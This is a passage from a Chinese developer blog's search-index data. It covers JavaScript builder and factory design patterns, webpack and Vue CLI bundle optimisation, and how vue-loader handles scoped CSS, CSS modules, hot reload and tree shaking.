this.hobby=param&amp;&amp;param.hobby||&#x27;保密&#x27;&#125;//类人原型方法Human.prototype=&#123; getSkill:function()&#123; return this.skill &#125;, getHobby:function()&#123; return this.hobby &#125;&#125;//实例化姓名类var Named=function(name)&#123; var that=this //构造器 //构造函数解析姓名的姓与名 (function(name,that)&#123; that.wholeName=name if(name.indexOf(&#x27; &#x27;)&gt;-1)&#123; that.FirstName=name.splice(0,name.indexOf(&#x27; &#x27;)) that.SecondName=name.splice(name.indexOf(&#x27; &#x27;)) &#125; &#125;)(name,that)&#125;//实例化职位类var Work=function(work)&#123; var that=this (function(work,that)&#123; switch(work)&#123; case &#x27;code&#x27;: that.work=&#x27;工程师&#x27;; that.workDescript=&#x27;每天沉迷于编程&#x27; break; case &#x27;UI&#x27;: case &#x27;UE&#x27;: that.work=&#x27;设计师&#x27;; that.workDescript=&#x27;设计是一种艺术&#x27; break; case &#x27;teacher&#x27;: that.work=&#x27;教师&#x27;; that.workDescript=&#x27;分享是一种快乐&#x27; break; default: that.work=work that.workDescript=&#x27;对不起，无您选择的职位&#x27; &#125; &#125;)(work,that)&#125;//更好期望的职位Work.prototype.changeWork=function(work)&#123; this.work=work&#125;Work.prototype.changeDescript=function(sentecnce)&#123; this.workDescript=sentecnce&#125;//应聘者建造者//参数 name workvar Person=function(name,work)&#123; //创建应聘者缓存对象 var _person=new Human() //创建应聘者姓名解析对象 _person.name=new Named(name) //创建应聘者工作解析对象 _person.work=new Work(work) return _person&#125;var person=new Person(&#x27;xiao ming&#x27;,&#x27;code&#x27;)console.log(person.skill)//保密console.log(person.name.FirstName)//xiaoconsole.log(person.work.work)//工程师 建造者模式和工厂模式的区别工厂模式创建出来的是一个对象，它追求的是创建的结果，创建的过程不是重点，而建造者模式不仅可以得到创建的结果，也参与了创建的具体过程，对于创建的具体实现的细节也参与了干涉，创建的对象更复杂，这种模式创建的对象时一个复合对象","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"工厂模式","slug":"简单工厂模式","date":"2022-05-12T07:35:32.000Z","updated":"2022-05-12T08:55:09.728Z","comments":true,"path":"2022/05/12/简单工厂模式/","link":"","permalink":"https://coloey.github.io/2022/05/12/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"简单工厂模式只提供一个类 1234567891011121314151617181920212223242526272829303132333435363738//蓝球基类var Basketball=function()&#123; this.intro=&quot;篮球&quot;&#125;Basketball.prototype=&#123; getMember:function()&#123; console.log(&#x27;每个队伍5名队员&#x27;) &#125;, getBallSize:function()&#123; console.log(&#x27;蓝球很大&#x27;) &#125;&#125;//足球基类var Football=function()&#123; this.intro=&#x27;足球&#x27;&#125;Football.prototype=&#123; getMember:function()&#123; console.log(&#x27;每个队伍需要11名队员&#x27;) &#125;, getBallSize:function()&#123; console.log(&#x27;租足球很大&#x27;) &#125;&#125;//运动工厂var SportFactory=function(name)&#123; switch(name)&#123; case &#x27;NBA&#x27;: return new Basketball(); case &#x27;wordCup&#x27;: return new Football() &#125;&#125;//为世界杯创建一个足球，只需要记住运动工厂，调用并创建var football=SportFactory(&#x27;wordCup&#x27;)console.log(football)console.log(football.intro)football.getMember() 抽象工厂模式抽象工厂其实就是一个实现子类继承父类的方法，在这个方法中我们通过传递子类以及要继承父类（抽象类）的名称，在抽象工厂方法中增加一次对抽象类存在性的一次判断，如果存在，则将子类继承父类的方法，然后子类通过寄生式继承，继承父类过程中，在对过渡类的原型继承时，我们不是继承父类的原型，而是通过new复制父类的一个实例，这么做是因为过渡类不应该仅仅继承父类的原型方法，还要继承父类的对象属性，通过new关键字将父类构造函数执行一遍来复制构造函数中的属性和方法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081//抽象工厂方法var VehicleFactory=function(subType,superType)&#123; //判断抽象工厂中是否有该抽象类 if(typeof VehicleFactory[superType]===&#x27;function&#x27;)&#123; //缓存类 function F()&#123; &#125; //继承父类属性和方法 F.prototype=new VehicleFactory[superType]() //将子类constructor指向子类 subType.constructor=subType //子类原型继承父类 subType.prototype=new F() &#125;else&#123; //不存在抽象类抛出错误 throw new Error(&#x27;未创建该抽象类&#x27;) &#125;&#125;//汽车抽象类VehicleFactory.Car=function()&#123; this.type=&#x27;car&#x27;&#125;VehicleFactory.Car.prototype=&#123; getPrice:function()&#123; return new Error(&#x27;抽象方法不能调用&#x27;) &#125;, getSpeed:function()&#123; return new Error(&#x27;抽象方法不能调用&#x27;) &#125;&#125;//公共车抽象类VehicleFactory.Bus=function()&#123; this.type=&#x27;bus&#x27;&#125;VehicleFactory.Bus.prototype=&#123; getPrice:function()&#123; return new Error(&#x27;抽象方法不能调用&#x27;) &#125;, getSpeed:function()&#123; return new Error(&#x27;抽象方法不能调用&#x27;) &#125;&#125;//货车抽象类VehicleFactory.Truck=function()&#123; this.type=&#x27;truck&#x27;&#125;VehicleFactory.Truck.prototype=&#123; getPrice:function()&#123; return new Error(&#x27;抽象方法不能调用&#x27;) &#125;, getSpeed:function()&#123; return new Error(&#x27;抽象方法不能调用&#x27;) &#125;&#125;//宝马汽车子类var BMW=function(price,speed)&#123; this.price=price; this.speed=speed&#125;//抽象工厂实现对Car抽象类继承VehicleFactory(BMW,&#x27;Car&#x27;)BMW.prototype.getPrice=function()&#123; return this.price&#125;BMW.prototype.getSpeed=function()&#123; return this.speed&#125;//兰博基尼汽车子类var Lamborghini=function (price,speed) &#123; this.price=price; this.speed=speed&#125;//抽象工厂实现对Car抽象类继承VehicleFactory(Lamborghini,&#x27;Car&#x27;)Lamborghini.prototype.getPrice=function()&#123; return this.price&#125;Lamborghini.prototype.getSpeed=function()&#123; return this.speed&#125;","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"记vuecli3聊天室项目webpack打包优化","slug":"记vuecli3聊天室项目webpack打包优化","date":"2022-05-11T09:58:40.000Z","updated":"2022-08-17T04:01:27.981Z","comments":true,"path":"2022/05/11/记vuecli3聊天室项目webpack打包优化/","link":"","permalink":"https://coloey.github.io/2022/05/11/%E8%AE%B0vuecli3%E8%81%8A%E5%A4%A9%E5%AE%A4%E9%A1%B9%E7%9B%AEwebpack%E6%89%93%E5%8C%85%E4%BC%98%E5%8C%96/","excerpt":"","text":"vue.config.js: 1 UglifyPlugin Webpack Plugin 插件用来缩小js文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576const UglifyJsPlugin=require(&#x27;uglifyjs-webpack-plugin&#x27;)module.exports = &#123; publicPath: process.env.NODE_ENV === &#x27;production&#x27; ? &#x27;/Vue-chat/&#x27; : &#x27;/&#x27; , // 输出文件目录 outputDir: &#x27;dist&#x27;, // eslint-loader 是否在保存的时候检查 lintOnSave: true, // use the full build with in-browser compiler? // https://vuejs.org/v2/guide/installation.html#Runtime-Compiler-vs-Runtime-only // compiler: false, // webpack配置 // see https://github.com/vuejs/vue-cli/blob/dev/docs/webpack.md chainWebpack: () =&gt; &#123;&#125;, //代码压缩 configureWebpack:&#123; plugins:[ new UglifyJsPlugin(&#123; uglifyOptions:&#123; compress:&#123; drop_debugger:true, drop_console:true, pure_funcs:[&#x27;console.log&#x27;]//删除console.log语句 &#125; &#125;, sourceMap:false, parallel:true &#125;) ], &#125;, // vue-loader 配置项 // https://vue-loader.vuejs.org/en/options.html // vueLoader: &#123;&#125;, // 生产环境是否生成 sourceMap 文件 productionSourceMap: true, // css相关配置 // css: &#123; // // // 是否使用css分离插件 ExtractTextPlugin // extract: true, // // 开启 CSS source maps? // sourceMap: false, // // // css预设器配置项 // loaderOptions: &#123; // css:&#123;&#125;,//这里的选项会传递给css-loader // postcss:&#123;&#125;//这里的选项会传递给postcss-loader // &#125;, // // // 启用 CSS modules for all css / pre-processor files. // requireModuleExtension: false // &#125;, // use thread-loader for babel &amp; TS in production build // enabled by default if the machine has more than 1 cores parallel: require(&#x27;os&#x27;).cpus().length &gt; 1,// 是否为 Babel 或 TypeScript 使用 thread-loader。该选项在系统的 CPU 有多于一个内核时自动启用，仅作用于生产构建。 // 是否启用dll // See https://github.com/vuejs/vue-cli/blob/dev/docs/cli-service.md#dll-mode // dll: false, // PWA 插件相关配置 // see https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-pwa pwa: &#123;&#125;, // webpack-dev-server 相关配置 devServer: &#123; open: process.platform === &#x27;darwin&#x27;, disableHostCheck: true, port:8081, https: false, hotOnly: false, before: app =&gt; &#123;&#125; &#125;, // 第三方插件配置 pluginOptions: &#123; // ... &#125; &#125; 2 路由懒加载：把不同路由对应的组件分割成不同的代码块，待路由被请求的时候会单独打包路由，使得入口文件变小，加载速度大大增加，以函数的形式加载路由，这样就可以把各自的路由文件分别打包，只有在解析给定的路由时，才会加载路由组件 123456routes:[&#123; path:&#x27;/&#x27;, name:&quot;通讯录&quot;, component:()=&gt;Promise.resolve(import(&quot;../components/contact/contact.vue&quot;)) &#125;, 3 UI框架按需加载在日常使用的UI框架，例如element-plus，我们经常直接使用整个UI库 1import ElemtPlus from &#x27;element-plus&#x27; 但实际上我用到的组件只有按钮，分页，表格，输入与警告，所以我们需要按需引用 12import &#123;Button,Input,Table,TableColumn,MessageBox&#125; from &#x27;element-plus&#x27; 4 静态资源本地缓存后端返回资源问题： 采用HTTP缓存，设置Cache-Control，Last-Modified，Etag等响应头 采用Service Worker离线缓存 前端合理利用localStorage 5 图片资源的压缩图片资源虽然不在编码过程中，但它却是对页面性能影响最大的因素 对于所有的图片资源，我们可以进行适当的压缩 对页面上使用到的icon，可以使用在线字体图标，或者雪碧图，将众多小图标合并到同一张图上，用以减轻http请求压力。 开启GZip压缩拆完包之后，我们再用gzip做一下压缩 安装compression-webpack-plugin 1npm i compression-webpack-plugin -D vue.config.js 1234567891011121314const CompressionPlugin = require(&#x27;compression-webpack-plugin&#x27;)configureWebpack: (config) =&gt; &#123; if (process.env.NODE_ENV === &#x27;production&#x27;) &#123; // 为生产环境修改配置... config.mode = &#x27;production&#x27; return &#123; plugins: [new CompressionPlugin(&#123; test: /\\.js$|\\.html$|\\.css/, //匹配文件名 threshold: 10240, //对超过10k的数据进行压缩 deleteOriginalAssets: false //是否删除原文件 &#125;)] &#125; &#125; 6 使用SSRSSR（Server side ），也就是服务端渲染，组件或页面通过服务器生成html字符串，再发送到浏览器 从头搭建一个服务端渲染是很复杂的，vue应用建议使用Nuxt.js实现服务端渲染","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"}],"tags":[]},{"title":"vue-loader的使用配置","slug":"vue-loader的使用配置","date":"2022-05-10T15:28:58.000Z","updated":"2022-05-12T16:22:52.372Z","comments":true,"path":"2022/05/10/vue-loader的使用配置/","link":"","permalink":"https://coloey.github.io/2022/05/10/vue-loader%E7%9A%84%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE/","excerpt":"","text":"一个包含vue-loader的简单webpack配置： 1234567891011121314151617181920212223242526272829303132333435363738394041424344const MiniCssExtractPlugin=require(&#x27;mini-css-extract-plugin&#x27;)const &#123;VueLoadPlugin&#125;=require(&#x27;vue-loader&#x27;)const isProduction=process.evv.NODE_ENV===&#x27;production&#x27;const extractLoader=&#123; loader:MiniCssExtractPlugin.loader, options:&#123; publicPath:&#x27;../&#x27;, hmr:process.env.NODE_ENV===&#x27;development&#x27;//开发环境下打开热更新 &#125;&#125;const cssExtractPlugin=new MiniCssExtractPlugin(&#123; filename:&#x27;[name].css&#x27;, chunkFilename:&#x27;[id].css&#x27;, ignoreOrder:false&#125;)const webpackConfig=&#123; entryd:&#123;...&#125;, output:&#123;...&#125;, optimization:&#123;...&#125;, resolve:&#123;...&#125;, modules:&#123; rules:[&#123; test:/\\.vue$/, loader:&#x27;vue-loader&#x27; &#125;,&#123; test:/\\.css$/, oneof:[&#123; resourceQuery:/\\?vue/, use:[isProduction?extractLoader:&#x27;vue-style-loader&#x27;,&#x27;css-loader&#x27;] &#125;,&#123; use:[isproduction?extractLoader:&#x27;style-loader&#x27;,&#x27;css-loader&#x27;] &#125; ] &#125;] &#125;, plugins:[ new VueLoaderPlugin(), isProduction?cssExtractPlugin:&#x27;&#x27; ] &#125; vue-loader工作原理通过vue-loader,webpack可以将.vue文件转化为浏览器可识别的javascript 将一个.vue文件分割成template,script,styles三部分 template部分通过compile生成render,staticRenderFns 获取script部分返回的配置对象scriptExports styles部分，会通过css-loader,vue-style-loader,添加到head中，或者通过css-loader,MiniCssExtractPlugin提取到一个公共的css文件 使用vue-loader提供的normalizeComponent方法，合并scriptExports,render,staticRenderFns,返回构建vue组件需要的配置对象-options,即{data,props,methods,render,staticRenderFns…} 12345678910111213141516171819202122232425262728// 从 template区域块 获取 render、 staticRenderFns 方法import &#123; render, staticRenderFns &#125; from &quot;./App.vue?vue&amp;type=template&amp;id=7ba5bd90&amp;scoped=true&amp;&quot;// 从 script区域块 获取 组件的配置项对象import script from &quot;./App.vue?vue&amp;type=script&amp;lang=js&amp;&quot;export * from &quot;./App.vue?vue&amp;type=script&amp;lang=js&amp;&quot;// 获取 styles区域块的内容import style0 from &quot;./App.vue?vue&amp;type=style&amp;index=0&amp;lang=css&amp;&quot;// 获取 styles(scoped)区域块的内容import style1 from &quot;./App.vue?vue&amp;type=style&amp;index=1&amp;id=7ba5bd90&amp;scoped=true&amp;lang=css&amp;&quot;/* normalize component */import normalizer from &quot;!../node_modules/_vue-loader@15.7.1@vue-loader/lib/runtime/componentNormalizer.js&quot;// 返回构建组件需要的配置项对象， 包含 data、props、render、staticRenderFns 等var component = normalizer( script, render, staticRenderFns, false, null, &quot;7ba5bd90&quot;, null )component.options.__file = &quot;src/App.vue&quot;// 输出组件完整的配置项export default component.exports css scoped当.vue文件中的style标签有scoped属性，它的css样式只作用于当前组件的元素 css scoped 的 工作流程 如下: 使用 vue-loader 处理 .vue 文件， 根据 .vue 文件 的 请求路径 和 文件内容， 生成 .vue 文件 的 hash 值, 如：7ba5bd90； 如果 .vue 文件 的 某一个 style 标签 有 scoped 属性， 为 .vue 文件 生成一个 scopedId，scopedId 的格式为 data-v-hash， 如：data-v-7ba5bd90； 使用 vue-loader 从 .vue 文件 中获取 style区域块(scoped) 的 **样式内容(字符串)**；如果使用了 less 或者 sass， 要使用 less-loader 或者 sass-loader 处理 样式内容，使 样式内容 变为 浏览器可识别的css样式； 然后使用 PostCSS 提供的 parser 处理 样式内容， 为 样式内容 中的每一个 css选择器 添加 **[data-v-hash]**； 再使用 css-loader；最后使用 style-loader 把 css 样式 添加到 head 中或者通过 miniCssExtractPlugin 将 css 样式 提取一个公共的 css 文件中。 通过 normalizer 方法返回 完整的组件配置项 options， options 中有属性 _scopeId, 如 _scopedId: data-v-7ba5bd90; 使用 组件配置项 options 构建组件实例， 给 组件 中每一个 dom元素 添加属性: data-v-hash。 经历上述过程，style(scoped) 中的样式就变成了 组件的私有样式。 深度作用选择器我们可以通过 &gt;&gt;&gt; 操作符， 在 组件 中修改 子组件 的 私有样式。 12345678910111213// child component.hello &#123;...&#125;// parent component &lt;style scoped&gt; .parant .hello &#123;...&#125; .parent &gt;&gt;&gt; .hello &#123;...&#125;&lt;/style&gt;// 进过 postCSS 处理以后的 css.parent .hello[data-v-xxx] &#123;...&#125; // 无法影响子组件.parant[data-v-xxx] .hello &#123;....&#125; // 可影响子组件 有些像 Sass 之类的 预处理器 无法 **正确解析 &gt;&gt;&gt;**。这种情况下我们可以使用 /deep/ 或 ::v-deep 操作符取而代之，两者都是 &gt;&gt;&gt; 的 别名，同样可以正常工作。 深度作用选择器， 必须在含有 scoped 属性 的 style 标签中使用，否则无效。 这是因为 &gt;&gt;&gt;、/deep/、::v-deep 需要被 postCSS 解析才能起作用。 只有 style 标签 中有 scoped 属性， 样式内容 才会被 postCSS 解析。 postCSS 解析样式内容的时候， 会给 &gt;&gt;&gt; 操作符 前面 的 css选择器 添加 **[data-v-hash]**。 注意： 父组件 中修改 子组件 的 私有样式 时， 父组件 中的 样式的优先级 要大于 子组件 中的 样式的优先级， 否则会导致 父组件中定义的样式不生效。 CSS Modules我们也可以在 .vue 文件 的 style 标签 上添加 module 属性， 使得 style 标签 中的 样式 变为 组件私有，具体使用方法详见 - 官网。 css modules 和 css scoped 都可以使 样式 变为 组件私有，但是 原理 不一样。 css scoped 的实质是利用 css属性选择器 使得 样式 称为 局部样式，而 css modules 的实质是让 样式的类名、id名唯一 使得 样式 称为 局部样式。 css modules 的 工作流程 如下: 使用 vue-loader 处理 .vue 文件， 将 .vue 文件内容 转化为 js 代码。 如果 .vue 文件 中的 style 标签 中有 module 属性， 向 js 代码 中注入一个 injectStyle 方法， 如下： 123456789101112131415161718192021222324252627282930import &#123; render, staticRenderFns &#125; from &quot;./App.vue?vue&amp;type=template&amp;id=3512ffa2&amp;scoped=true&amp;&quot; import script from &quot;./App.vue?vue&amp;type=script&amp;lang=js&amp;&quot; export * from &quot;./App.vue?vue&amp;type=script&amp;lang=js&amp;&quot; import style0 from &quot;./App.vue?vue&amp;type=style&amp;index=0&amp;module=a&amp;lang=css&amp;&quot; import style1 from &quot;./App.vue?vue&amp;type=style&amp;index=1&amp;id=3512ffa2&amp;module=true&amp;scoped=true&amp;lang=css&amp;&quot; // 通过injectStyle方法， 会向vue实例中添加属性 function injectStyles (context) &#123; // 对应 &lt;style module=&quot;a&quot;&gt;...&lt;/style&gt; // 给vue实例添加属性a， 对应的值为使用css-loader处理样式内容以后返回的对象 this[&quot;a&quot;] = (style0.locals || style0) // 对应 &lt;style module&gt;...&lt;/style&gt; // 给vue实例添加属性$style, 对应的值为使用css-loader处理样式内容以后返回的对象 this[&quot;$style&quot;] = (style1.locals || style1) &#125; /* normalize component */ import normalizer from &quot;!../node_modules/_vue-loader@15.7.1@vue-loader/lib/runtime/componentNormalizer.js&quot; // normalize 会返回一个组件完整配置项对象 // 在执行过程中， 会将render方法重新包装成 renderWithStyleInjection 方法 // 执行 renderWithStyleInjection 方法时的时候， 先执行 injectStyles 方法， 再执行 原来的render 方法 var component = normalizer( script, render, staticRenderFns, false, injectStyles, &quot;3512ffa2&quot;, null ) export default component.exports&quot; 使用 css-loader 处理 .vue 文件 的 style 区域块，会将 style 区域块 中的样式内容， 转化为 js 代码， 如下: 12345678910exports = module.exports = require(&quot;../node_modules/_css-loader@3.2.0@css-loader/dist/runtime/api.js&quot;)(false); // Module exports.push([module.id, &quot;\\n#_3cl756BP8kssTYTEsON-Ao &#123;\\n font-family: &#x27;Avenir&#x27;, Helvetica, Arial, sans-serif;\\n -webkit-font-smoothing: antialiased;\\n -moz-osx-font-smoothing: grayscale;\\n text-align: center;\\n color: #2c3e50;\\n margin-top: 60px;\\n&#125;\\n._3IbrnaW__7RJMXk4rh9tW- &#123;\\n background-color: blue;\\n&#125;\\n&quot;, &quot;&quot;]); // Exports exports.locals = &#123; // app是id名 &quot;app&quot;: &quot;_3cl756BP8kssTYTEsON-Ao&quot;, // class 是 类名 &quot;class1&quot;: &quot;_3IbrnaW__7RJMXk4rh9tW-&quot; &#125; 在处理过程中， css-loader 会将样式中的 类名、id名 等用一个 唯一的命名代替。在执行 步骤1 的代码时，会执行上面的代码， 返回一个 对象， 即 步骤一 中的 style0 、style1， 格式如下: 1234567// css样式内容会通过 style-loader 提供的方法添加到 head 中 // 或者被 miniCssExtractPlugin 提取到一个 公共的css文件 中 style0 = [[css模块 id, css样式内容字符串, &#x27;&#x27;], ...] style0.locals = &#123; &quot;app&quot;: &quot;_3cl756BP8kssTYTEsON-Ao&quot;, &quot;class1&quot;: &quot;_3IbrnaW__7RJMXk4rh9tW-&quot; &#125; 运行项目执行打包以后的js代码， 即 步骤1中的代码， 获取 render、staticRenderFns、scriptExprots、 style0、style1， 然后通过 normalizer 方法返回 组件完整配置项 - options。 在执行过程中，将 render 方法重新包装成 renderWithStyleInjection 方法。构建 vue 实例 时，执行 renderWithStyleInjection 方法， 此时会 先 执行 injectStyles 方法，给 vue 实例 添加 $style、a 属性，属性值为 stlye0.locals、style1.locals， 再执行原来的 render 方法。这样， 我们就可以通过 vue 实例 的 $style、a 属性访问 样式 的 类名、id名。 热更新开发模式 下，当使用 vue-loader、 vue-style-loader 处理 .vue 文件 的时候， 会向 生成的js代码 中注入与 热更新 相关的代码逻辑。 当我们修改 .vue 文件 时， dev-server 会通知 浏览器 进行 热更新。 .vue 文件 的 各个区域块(template、script、styles) 对应的 热更新逻辑 都不一样。 template &amp; script vue-loader 会在 打包代码 中注入 热更新 template、script 区域块 的代码，如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 从 template区域块 获取 render、 staticRenderFns 方法 import &#123; render, staticRenderFns &#125; from &quot;./App.vue?vue&amp;type=template&amp;id=7ba5bd90&amp;scoped=true&amp;&quot; // 从 script区域块 获取 组件的配置项对象 import script from &quot;./App.vue?vue&amp;type=script&amp;lang=js&amp;&quot; export * from &quot;./App.vue?vue&amp;type=script&amp;lang=js&amp;&quot; // 获取 styles区域块的内容 import style0 from &quot;./App.vue?vue&amp;type=style&amp;index=0&amp;lang=css&amp;&quot; // 获取 styles(scoped)区域块的内容 import style1 from &quot;./App.vue?vue&amp;type=style&amp;index=1&amp;id=7ba5bd90&amp;scoped=true&amp;lang=css&amp;&quot; /* normalize component */ import normalizer from &quot;!../node_modules/_vue-loader@15.7.1@vue-loader/lib/runtime/componentNormalizer.js&quot; // 返回构建组件需要的配置项对象， 包含 data、props、render、staticRenderFns 等 var component = normalizer( script, render, staticRenderFns, false, null, &quot;7ba5bd90&quot;, null ) /* hot reload */ // .vue 文件的 script 区域块更改时， 客户端执行这一段代码 if (module.hot) &#123; var api = require(&quot;D:\\\\study\\\\demo\\\\webpack\\\\webpack-4-demo\\\\node_modules\\\\_vue-hot-reload-api@2.3.3@vue-hot-reload-api\\\\dist\\\\index.js&quot;) api.install(require(&#x27;vue&#x27;)) if (api.compatible) &#123; module.hot.accept() if (!api.isRecorded(&#x27;7ba5bd90&#x27;)) &#123; api.createRecord(&#x27;7ba5bd90&#x27;, component.options) &#125; else &#123; // 执行 reload 方法， 触发更新 // 使用 新的 options 替换原来的 options api.reload(&#x27;7ba5bd90&#x27;, component.options) &#125; module.hot.accept(&quot;./App.vue?vue&amp;type=template&amp;id=7ba5bd90&amp;scoped=true&amp;&quot;, function () &#123; // 当 .vue 文件的 template 区域块更改时， 客户端执行这一段代码 // 使用新的 render、staticRenderFns 更新原来的render、staticRenderFns api.rerender(&#x27;7ba5bd90&#x27;, &#123; render: render, staticRenderFns: staticRenderFns &#125;) &#125;) &#125; &#125; component.options.__file = &quot;src/App.vue&quot; // 输出组件完整的配置项 export default component.exports 如果我们只修改了 .vue 文件 的 script 部分， 客户端(即浏览器) 会进行 热更新， 过程如下： 服务端 通过 websocket 连接 通知 客户端 更新； 客户端 通过 动态添加script元素 的方式获取 更新以后的打包文件； 安装打包文件，即执行 新的打包文件 中的 js 代码， 使用 打包文件中的 module 更新浏览器缓存的同名 module； 重新安装组件对应的 module， 即 重新执行组件对应的js代码， 获取 render、staticRenderFns 和 新的 scriptExports， 重新生成 组件 对应的 完整配置项； 执行 api 提供的 reload 方法， 更新组件。在 reload 方法中，会通过执行 父组件实例 的 $forceUpdate 方法来 更新组件。更新组件的时候， 由于组件 的 配置项(data、props、methods等属性) 发生变化， 需要为 组件 生成 新的构造函数 VueComponent， 然后使用 新的构造函数，构建 新的组件实例。即， 每次修改 .vue 文件 的 script 部分， 都会为 组件 生成一个 新的实例对象， 销毁旧的实例对象。如果我们只修改了 .vue 文件 的 template 部分, 客户端(即浏览器) 会进行 热更新， 过程如下： 同上，服务端 通过 websocket 连接 通知 客户端 更新； 同上， 客户端 通过 动态添加script元素 的方式获取 更新以后的打包文件； 同上， 安装打包文件，即执行 新的打包文件 中的 js 代码， 使用 打包文件中的 module 更新浏览器缓存的同名 module； 触发通过 module.hot.accept 注册的 callback； 执行 api 提供的 rerender 方法， 更新组件。执行 rerender 方法时， 会先获取 修改以后的template区域块 对应的 render、staticRenderFns， 然后 更新原组件的 render、staticRenderFns， 然后执行 组件实例 的 $forceUpdate 方法来更新 **组件(更新组件的时候， 会使用新的render方法， 生成新的vnode节点树)**。如果我们 同时 修改了 .vue 文件的 template、 script部分， 会按照上面 第一种情况 进行 热更新，并且不会触发上面代码中通过 module.hot.accept 注册的 callback。 style vue-style-loader 会在 打包代码 中注入 热更新 style区域块 的代码， 如下: 12345678910111213141516ar add = require(&quot;!../node_modules/_vue-style-loader@4.1.2@vue-style-loader/lib/addStylesClient.js&quot;).default var update = add(&quot;05835b6f&quot;, content, false, &#123;&#125;); // Hot Module Replacement if(module.hot) &#123; // When the styles change, update the &lt;style&gt; tags if(!content.locals) &#123; module.hot.accept(&quot;!!../node_modules/_css-loader@3.1.0@css-loader/dist/cjs.js!../node_modules/_vue-loader@15.7.1@vue-loader/lib/loaders/stylePostLoader.js!../node_modules/_vue-loader@15.7.1@vue-loader/lib/index.js??vue-loader-options!./App.vue?vue&amp;type=style&amp;index=0&amp;lang=css&amp;&quot;, function() &#123; // 当 .vue 文件的 styles 区域块更改时， 客户端执行这一段代码 var newContent = require(&quot;!!../node_modules/_css-loader@3.1.0@css-loader/dist/cjs.js!../node_modules/_vue-loader@15.7.1@vue-loader/lib/loaders/stylePostLoader.js!../node_modules/_vue-loader@15.7.1@vue-loader/lib/index.js??vue-loader-options!./App.vue?vue&amp;type=style&amp;index=0&amp;lang=css&amp;&quot;); if(typeof newContent === &#x27;string&#x27;) newContent = [[module.id, newContent, &#x27;&#x27;]]; // 执行update方法， 更新styles update(newContent); &#125;); &#125; &#125; ... 如果我们修改了 .vue 文件 的 styles 区域块，客户端(即浏览器) 会进行 热更新， 过程如下： 同上，服务端 通过 websocket 连接 通知 客户端 更新； 同上，客户端 通过 动态添加script元素 的方式获取 更新以后的打包文件； 同上，安装打包文件，即执行 新的打包文件 中的 js 代码， 使用 打包文件中的 module 更新浏览器缓存的同名 module; 触发通过 module.hot.accept 注册的 callback； 执行 update 方法， 更新样式。更新样式 的时候， 会先 移除原来的 style 标签， 然后 添加新的 style 标签。如果 style 标签 上有 module 属性，除了 vue-style-loader 会注入 热更新代码 外，vue-loader 也会在 打包代码 中注入 热更新代码，如下: 123456789101112131415// 热更新代码 module.hot &amp;&amp; module.hot.accept([&quot;./App.vue?vue&amp;type=style&amp;index=1&amp;id=7ba5bd90&amp;module=true&amp;scoped=true&amp;lang=css&amp;&quot;], function () &#123; // 当.vue的style区域块发生变化， 且style标签有module属性， 执行这一段逻辑 var oldLocals = cssModules[&quot;$style&quot;] if (oldLocals) &#123; // 获取新的唯一类名、id名 var newLocals = require(&quot;./App.vue?vue&amp;type=style&amp;index=1&amp;id=7ba5bd90&amp;module=true&amp;scoped=true&amp;lang=css&amp;&quot;) if (JSON.stringify(newLocals) !== JSON.stringify(oldLocals)) &#123; // 更新vue实例的$style属性 cssModules[&quot;$style&quot;] = newLocals // 执行vue实例的 $forceUpdate 方法，重新执行 render 方法 require(&quot;D:\\\\study\\\\demo\\\\webpack\\\\webpack-4-demo\\\\node_modules\\\\_vue-hot-reload-api@2.3.3@vue-hot-reload-api\\\\dist\\\\index.js&quot;).rerender(&quot;7ba5bd90&quot;) &#125; &#125; &#125;) 执行上述 热更新代码， 会 更新 vue实例 的 $style 属性， 然后触发 vue 实例 的 $forceUpdate 方法， 重新渲染。一个 style 区域块 对应一个 style 标签。修改某一个 style 区域块 之后，会更新对应的 style 标签。style 区域块 的 热更新 和 template、script 区域块的 热更新 互不影响。 tree shaking 副作用生产模式 下， webpack 默认启用 tree shaking。如果此时项目 根目录 中的 package.json 中的 sideEffects 的值为 false，且 .vue 文件 的 style 标签 没有 module 属性，使用 vue-loader 处理 .vue 文件 的时候， 会产生 样式丢失 的情况，即 styles 区域块 不会添加到 head 中或者 被提取到公共的css文件中。 首先，先看一下 .vue 文件 经过处理以后生成的 js代码， 如下: 12345678910111213141516171819202122232425262728/ 从 template区域块 获取 render、 staticRenderFns 方法import &#123; render, staticRenderFns &#125; from &quot;./App.vue?vue&amp;type=template&amp;id=7ba5bd90&amp;scoped=true&amp;&quot;// 从 script区域块 获取 组件的配置项对象import scriptExports from &quot;./App.vue?vue&amp;type=script&amp;lang=js&amp;&quot;export * from &quot;./App.vue?vue&amp;type=script&amp;lang=js&amp;&quot;// 获取 styles区域块的内容import style0 from &quot;./App.vue?vue&amp;type=style&amp;index=0&amp;lang=css&amp;&quot;// 获取 styles(scoped)区域块的内容import style1 from &quot;./App.vue?vue&amp;type=style&amp;index=1&amp;id=7ba5bd90&amp;scoped=true&amp;lang=css&amp;&quot;/* normalize component */import normalizer from &quot;!../node_modules/_vue-loader@15.7.1@vue-loader/lib/runtime/componentNormalizer.js&quot;// 返回构建组件需要的配置项对象， 包含 data、props、render、staticRenderFns 等var component = normalizer( scriptExports, render, staticRenderFns, false, null, &quot;7ba5bd90&quot;, null )component.options.__file = &quot;src/App.vue&quot;// 输出组件完整的配置项export default component.exports 在上面的代码中，template 区域块 返回的 render、staticRenderFns， script 区域块 返回的 scriptExports， 都有被 normalizer 方法使用， 而 styles 区域块 返回的 style0、style1 则没有被使用。 在 打包代码 的时候， tree shaking 就会自动移除 styles 区域块 对应的代码，导致 样式丢失。 解决方法: 修改 package.json 文件中的 sideEffects 属性， 告诉 webpack .vue 文件在使用 tree shaking 的时候会有 副作用， 如下: 